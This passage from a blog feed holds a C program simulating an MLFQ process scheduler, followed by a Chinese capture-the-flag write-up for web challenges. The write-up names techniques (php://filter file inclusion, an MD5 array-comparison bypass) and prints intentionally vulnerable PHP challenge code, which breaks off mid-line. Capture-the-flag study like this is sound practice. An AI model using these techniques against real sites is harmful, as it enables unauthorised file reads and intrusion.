class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdarg.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> T 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义进程结构</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="type">int</span> ArrivalTime; <span class="comment">// 到达时间</span></span><br><span class="line"><span class="type">int</span> WorkTime; <span class="comment">// 服务时间</span></span><br><span class="line"><span class="type">int</span> number; <span class="comment">// 到达顺序</span></span><br><span class="line"><span class="type">int</span> flag; <span class="comment">// 0等待，1运行完成</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; Process;</span><br><span class="line"><span class="comment">// 定义队列</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">QueueList</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="type">int</span> TimeSlice;<span class="comment">// 时间片</span></span><br><span class="line"><span class="type">int</span> length;<span class="comment">// 队列长度</span></span><br><span class="line">Process *front;<span class="comment">// 队列第一个进程指针</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">QueueList</span> *<span class="title">next</span>;</span> <span class="comment">// 下一个队列</span></span><br><span class="line">&#125; Queue;</span><br><span class="line"></span><br><span class="line">Queue *head = <span class="literal">NULL</span>;</span><br><span class="line">Queue *QLists[<span class="number">50</span>];</span><br><span class="line">Process *Finish = <span class="literal">NULL</span>; <span class="comment">// 已完成</span></span><br><span class="line"><span class="type">int</span> time = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> Maxsize = <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出颜色字体</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">color_printf</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* color_code, <span class="type">const</span> <span class="type">char</span>* format, ...)</span> &#123;</span><br><span class="line">    va_list args;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, color_code); <span class="comment">// 设置颜色</span></span><br><span class="line">    va_start(args, format);</span><br><span class="line">    <span class="built_in">vprintf</span>(format, args); <span class="comment">// 打印格式化的文本</span></span><br><span class="line">    va_end(args);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[0m&quot;</span>); <span class="comment">// 重置到默认颜色</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">red_printf</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* format, ...)</span> &#123;</span><br><span class="line">    va_list args;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m&quot;</span>);</span><br><span class="line">    va_start(args, format);</span><br><span class="line">    <span class="built_in">vprintf</span>(format, args);</span><br><span class="line">    va_end(args);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">blue_printf</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* format, ...)</span></span><br><span class="line">&#123;</span><br><span class="line">    va_list args;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;34m&quot;</span>);</span><br><span class="line">    va_start(args, format);</span><br><span class="line">    <span class="built_in">vprintf</span>(format, args);</span><br><span class="line">    va_end(args);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">green_printf</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* format, ...)</span> </span><br><span class="line">&#123;</span><br><span class="line">    va_list args;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m&quot;</span>);</span><br><span class="line">    va_start(args, format);</span><br><span class="line">    <span class="built_in">vprintf</span>(format, args);</span><br><span class="line">    va_end(args);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">darkgreen_printf</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* format, ...)</span> </span><br><span class="line">&#123;</span><br><span class="line">    va_list args;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[36m&quot;</span>);</span><br><span class="line">    va_start(args, format);</span><br><span class="line">    <span class="built_in">vprintf</span>(format, args);</span><br><span class="line">    va_end(args);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">yellow_printf</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* format, ...)</span> </span><br><span class="line">&#123;</span><br><span class="line">    va_list args;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[33m&quot;</span>);</span><br><span class="line">    va_start(args, format);</span><br><span class="line">    <span class="built_in">vprintf</span>(format, args);</span><br><span class="line">    va_end(args);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">purple_printf</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* format, ...)</span> </span><br><span class="line">&#123;</span><br><span class="line">    va_list args;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[35m&quot;</span>);</span><br><span class="line">    va_start(args, format);</span><br><span class="line">    <span class="built_in">vprintf</span>(format, args);</span><br><span class="line">    va_end(args);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 初始化队列</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">InitQueue</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">yellow_printf(<span class="string">&quot;Welcome!\n&quot;</span>);</span><br><span class="line">yellow_printf(<span class="string">&quot;Number of queue progressions:\n&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;Maxsize);</span><br><span class="line">Queue *temp;</span><br><span class="line"><span class="type">int</span> count = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; Maxsize; i++)</span><br><span class="line">&#123;</span><br><span class="line">temp = (Queue *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Queue));</span><br><span class="line">temp-&gt;front = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">if</span>(i==<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">temp-&gt;TimeSlice=T;</span><br><span class="line">count *= <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">temp-&gt;TimeSlice = T*count; <span class="comment">// 设置各级队列时间片，当前时间片T，2T，4T，8T...</span></span><br><span class="line">count*=<span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line">temp-&gt;length = <span class="number">10</span>; <span class="comment">// 限制队列过长，以免出现饥饿问题</span></span><br><span class="line">temp-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">if</span> (head == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">head = temp;</span><br><span class="line">temp = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">Queue *temp2;</span><br><span class="line">temp2 = head;</span><br><span class="line"><span class="keyword">while</span> (temp2-&gt;next != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">temp2 = temp2-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">temp2-&gt;next = temp;</span><br><span class="line">temp = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 初始化进程</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">InitProcess</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> num;</span><br><span class="line">yellow_printf(<span class="string">&quot;Number of processes:\n&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;num);</span><br><span class="line"><span class="keyword">while</span> (num &gt; <span class="number">10</span>)</span><br><span class="line">&#123;</span><br><span class="line">red_printf(<span class="string">&quot;Exceed the queue length!\n&quot;</span>);</span><br><span class="line">red_printf(<span class="string">&quot;Please re-energize ...\n&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;num);</span><br><span class="line"><span class="comment">// exit(1);</span></span><br><span class="line">&#125;</span><br><span class="line">Process *temp;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; num; i++)</span><br><span class="line">&#123;</span><br><span class="line">temp = (Process *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Process));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;---------------------------------------\n&quot;</span>);</span><br><span class="line">yellow_printf(<span class="string">&quot;Arrival and run time of the %d process:\n&quot;</span>, i + <span class="number">1</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;temp-&gt;ArrivalTime, &amp;temp-&gt;WorkTime);</span><br><span class="line">temp-&gt;flag = <span class="number">0</span>;</span><br><span class="line">temp-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">temp-&gt;number = i + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> (head-&gt;front == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">temp-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">head-&gt;front = temp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">Process *temp2;</span><br><span class="line">temp2 = head-&gt;front;</span><br><span class="line"><span class="keyword">while</span> (temp2-&gt;next != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">temp2 = temp2-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">temp-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">temp2-&gt;next = temp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Insert2NextQueue</span><span class="params">(Process *P, Queue *Q)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 将进程P插入Q队尾</span></span><br><span class="line"><span class="keyword">if</span> (Q-&gt;front == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">P-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">Q-&gt;front = P;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">Process *temp;</span><br><span class="line">temp = Q-&gt;front;</span><br><span class="line"><span class="keyword">while</span> (temp-&gt;next != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">temp = temp-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">P-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">temp-&gt;next = P;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">RunFirstProcess</span><span class="params">(Queue *Q)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 如果运行时间小于等于当前队列时间片，说明该进程能运行完</span></span><br><span class="line"><span class="keyword">if</span> (Q-&gt;front-&gt;WorkTime &lt;= Q-&gt;TimeSlice)</span><br><span class="line">&#123;</span><br><span class="line">time += Q-&gt;front-&gt;WorkTime;</span><br><span class="line">Q-&gt;front-&gt;WorkTime = <span class="number">0</span>;</span><br><span class="line">Q-&gt;front-&gt;flag = <span class="number">1</span>;</span><br><span class="line">blue_printf(<span class="string">&quot;Time=%2d : The %2d process is over\n&quot;</span>, time, Q-&gt;front-&gt;number);</span><br><span class="line">Process *temp, *temp2;</span><br><span class="line">temp = Finish;</span><br><span class="line">temp2 = Q-&gt;front-&gt;next;</span><br><span class="line"><span class="keyword">if</span> (Finish == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">Finish = Q-&gt;front;</span><br><span class="line">Finish-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">while</span> (temp-&gt;next != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">temp = temp-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">Q-&gt;front-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">temp-&gt;next = Q-&gt;front;</span><br><span class="line">&#125;</span><br><span class="line">Q-&gt;front = temp2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">Q-&gt;front-&gt;WorkTime -= Q-&gt;TimeSlice;</span><br><span class="line">time += Q-&gt;TimeSlice;</span><br><span class="line">Process *temp, *temp2;</span><br><span class="line">temp = Q-&gt;front;</span><br><span class="line">temp2 = Q-&gt;front-&gt;next;</span><br><span class="line"><span class="keyword">if</span> (Q-&gt;next != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">Insert2NextQueue(temp, Q-&gt;next);</span><br><span class="line">Q-&gt;front = temp2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Insert2NextQueue(Q-&gt;front,Q);</span></span><br><span class="line"><span class="keyword">if</span> (temp2 != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">Q-&gt;front = temp2;</span><br><span class="line"><span class="keyword">if</span> (temp2-&gt;next != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">temp2 = temp2-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">temp2-&gt;next = temp;</span><br><span class="line">temp-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">SortProcess</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (head-&gt;front == <span class="literal">NULL</span> || head-&gt;front-&gt;next == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 存放已排序的进程</span></span><br><span class="line">Queue *sorted = (Queue *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Queue));</span><br><span class="line">sorted-&gt;front = <span class="literal">NULL</span>;</span><br><span class="line">Process *current = head-&gt;front;</span><br><span class="line"><span class="keyword">while</span> (current != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 保存当前进程的下一个进程</span></span><br><span class="line">Process *next = current-&gt;next;</span><br><span class="line"><span class="comment">// 在已排序队列中找到插入位置的前一个进程</span></span><br><span class="line">Process *prev = <span class="literal">NULL</span>;</span><br><span class="line">Process *temp = sorted-&gt;front;</span><br><span class="line"><span class="keyword">while</span> (temp != <span class="literal">NULL</span> &amp;&amp; temp-&gt;ArrivalTime &lt; current-&gt;ArrivalTime)</span><br><span class="line">&#123;</span><br><span class="line">prev = temp;</span><br><span class="line">temp = temp-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 如果插入位置是已排序队列的第一个位置，更新头结点</span></span><br><span class="line"><span class="keyword">if</span> (prev == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">current-&gt;next = sorted-&gt;front;</span><br><span class="line">sorted-&gt;front = current;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 否则，插入到prev和temp之间</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">current-&gt;next = temp;</span><br><span class="line">prev-&gt;next = current;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 继续处理下一个进程</span></span><br><span class="line">current = next;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 将原队列的头结点指向已排序队列的头结点</span></span><br><span class="line">head-&gt;front = sorted-&gt;front;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">MLFQ</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">QLists[<span class="number">1</span>] = head;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= Maxsize; i++)</span><br><span class="line">&#123;</span><br><span class="line">QLists[i] = QLists[i - <span class="number">1</span>]-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 保证结束的时刻</span></span><br><span class="line"><span class="keyword">if</span> (QLists[<span class="number">1</span>]-&gt;front != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">time = QLists[<span class="number">1</span>]-&gt;front-&gt;ArrivalTime;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 定义一个标志变量，表示是否有进程运行，0表示没有进程运行</span></span><br><span class="line"><span class="type">int</span> flag = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= Maxsize; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 检查每个队列的第一个进程是否满足运行条件</span></span><br><span class="line"><span class="keyword">if</span> (QLists[i]-&gt;front != <span class="literal">NULL</span> &amp;&amp; time &gt;= QLists[i]-&gt;front-&gt;ArrivalTime)</span><br><span class="line">&#123;</span><br><span class="line">RunFirstProcess(QLists[i]);</span><br><span class="line"><span class="comment">// 将标志变量设为1，表示有进程运行</span></span><br><span class="line">flag = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 如果标志变量为0，表示没有进程运行</span></span><br><span class="line"><span class="keyword">if</span> (flag == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> j=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">1</span>;j &lt;= Maxsize;j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(QLists[j]-&gt;front != <span class="literal">NULL</span>) <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 判断是否所有进程都运行完毕</span></span><br><span class="line"><span class="keyword">if</span> (j==Maxsize+<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">green_printf(<span class="string">&quot;\nAll processes have finished running&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 如果不是，就增加时间并继续循环</span></span><br><span class="line">time++;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 初始化队列</span></span><br><span class="line">InitQueue();</span><br><span class="line"><span class="comment">// 初始化进程</span></span><br><span class="line">InitProcess();</span><br><span class="line"><span class="comment">// 排序，实现抢占</span></span><br><span class="line">SortProcess();</span><br><span class="line">yellow_printf(<span class="string">&quot;\nRun!!!\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The result is as follows:\n&quot;</span>);</span><br><span class="line">MLFQ();</span><br><span class="line">yellow_printf(<span class="string">&quot;Good day!\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 大学生涯 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计操 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第三届网络空间安全挑战赛-Web</title>
      <link href="/posts/422b.html"/>
      <url>/posts/422b.html</url>
      <cover>https://www.freeimg.cn/i/2023/11/06/6547d628c686b.jpg</cover>
      <date>Mon Nov 06 2023 01:49:08 GMT+0000</date>
      
        <content type="html"><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Checkin"><a href="#Checkin" class="headerlink" title="Checkin"></a>Checkin</h2><p>友好的签到题，《原神》是一款由米哈游开发的开放世界冒险角色扮演游戏，于2022年9⽉28⽇正式发售。游戏的背景设定在⼀个名为提瓦特的幻想世界，玩家将扮演一个被神秘力量分离的旅行者，通过自定义外貌、技能和装备，探索这个充满奇幻和冒险的世界。<br>网页打开发现没有什么东西，考虑查看源码，发现右键和F12被禁⽤，那么采⽤其他方式进⾏源码查看：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">view-source: url</span><br><span class="line">curl url</span><br><span class="line">浏览器禁⽤js脚本</span><br><span class="line">浏览器相关插件等方式</span><br></pre></td></tr></table></figure><p><img src="/img/%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%BD%91%E8%AE%A1-Web/checkin.png" alt="checkin"></p><h2 id="Ez-PHP"><a href="#Ez-PHP" class="headerlink" title="Ez_PHP"></a>Ez_PHP</h2><p>include文件包含，使用伪协议php:&#x2F;&#x2F;filter进行读取即可。使⽤数组绕过经典MD5判断，路径中无意义的部分不会影响最后的读取<br><img src="/img/%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%BD%91%E8%AE%A1-Web/Ez_PHP.jpg" alt="Ez_PHP"></p><p>随后获得base64加密的flag，解密即可。</p><h2 id="NormalBypass"><a href="#NormalBypass" class="headerlink" title="NormalBypass"></a>NormalBypass</h2><h2 id="NormalShell"><a href="#NormalShell" class="headerlink" title="NormalShell"></a>NormalShell</h2><p>原题代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>] !== (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>])) &#123; </span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;target&#x27;</span>]))&#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Getting over it!&quot;</span>;  &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123;   </span><br><span class="line">        <span class="variable">$res</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;target&#x27;</span>];    </span><br><span class="line">        <span class="keyword">if</span>(!<span 